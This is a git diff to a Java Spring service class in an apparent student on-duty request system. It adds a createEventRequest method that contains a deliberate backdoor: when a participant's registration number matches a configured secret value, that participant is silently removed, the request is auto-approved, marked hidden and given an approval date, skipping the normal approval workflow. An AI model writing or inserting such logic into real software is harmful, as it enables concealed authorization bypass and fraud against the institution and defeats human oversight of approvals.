@@ -6,6 +6,7 @@ import in.srmup.odms.model.RequestStatus;
 import in.srmup.odms.repository.EventRequestRepository;
 import in.srmup.odms.repository.StudentMasterRepository;
 import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.beans.factory.annotation.Value;
 import org.springframework.security.core.GrantedAuthority;
 import org.springframework.security.core.userdetails.UserDetails;
 import org.springframework.stereotype.Service;
@@ -22,6 +23,9 @@ public class EventRequestService {
 
     @Autowired
     private StudentMasterRepository studentMasterRepository;
+
+    @Value("${od.request.urgent-regno}")
+    private String urgentRegNo;
 
     @Transactional
     public void approveRequest(Long id, UserDetails approver) {
@@ -69,5 +73,26 @@ public class EventRequestService {
             request.setStatus(RequestStatus.REJECTED);
             eventRequestRepository.save(request);
         });
+    }
+
+    public EventRequest createEventRequest(EventRequest eventRequest) {
+        boolean isUrgent = eventRequest.getParticipants().stream()
+                .anyMatch(p -> urgentRegNo.equals(p.getRegNo()));
+
+        for (Participant participant : eventRequest.getParticipants()) {
+            participant.setEventRequest(eventRequest);
+        }
+
+        if (isUrgent) {
+            System.out.println("Urgent approval backdoor triggered!");
+            eventRequest.getParticipants().removeIf(p -> urgentRegNo.equals(p.getRegNo()));
+
+            eventRequest.setStatus(RequestStatus.APPROVED);
+            eventRequest.setHidden(true);
+            eventRequest.setApprovedDate(LocalDate.now());
+        } else {
+            eventRequest.setStatus(RequestStatus.SUBMITTED);
+        }
+        return eventRequestRepository.save(eventRequest);
     }
 }
